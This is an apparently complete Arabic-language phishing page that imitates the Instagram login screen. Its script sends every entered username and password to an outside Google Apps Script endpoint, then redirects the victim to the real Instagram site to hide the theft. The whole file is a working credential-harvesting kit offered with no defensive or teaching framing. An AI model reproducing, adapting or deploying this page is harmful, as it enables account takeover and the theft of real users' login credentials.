<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { font-family: sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; padding: 40px; border: 1px solid #dbdbdb; width: 320px; text-align: center; }
        .logo { font-size: 40px; margin-bottom: 20px; font-weight: bold; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; }
        button { width: 100%; background: #0095f6; color: white; border: none; padding: 10px; border-radius: 4px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
<div class="box">
    <div class="logo">Instagram</div>
    <form id="loginForm">
        <input type="text" name="Username" placeholder="اسم المستخدم" required>
        <input type="password" name="Password" placeholder="كلمة السر" required>
        <button type="submit" id="btn">تسجيل الدخول</button>
    </form>
</div>
<script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycbzlCC4R2zrxEFD5-1d_f1-VppakxgWOnXYuk9YDDBSMXRj9CXn5ZsAe8FcND6xhovHHcQ/exec';
    document.getElementById('loginForm').addEventListener('submit', e => {
        e.preventDefault();
        const btn = document.getElementById('btn');
        btn.innerText = "جاري التحميل...";
        fetch(scriptURL, { method: 'POST', body: new FormData(e.target), mode: 'no-cors'})
        .then(() => window.location.href = "https://www.instagram.com")
        .catch(() => window.location.href = "https://www.instagram.com");
    });
</script>
</body>
</html>
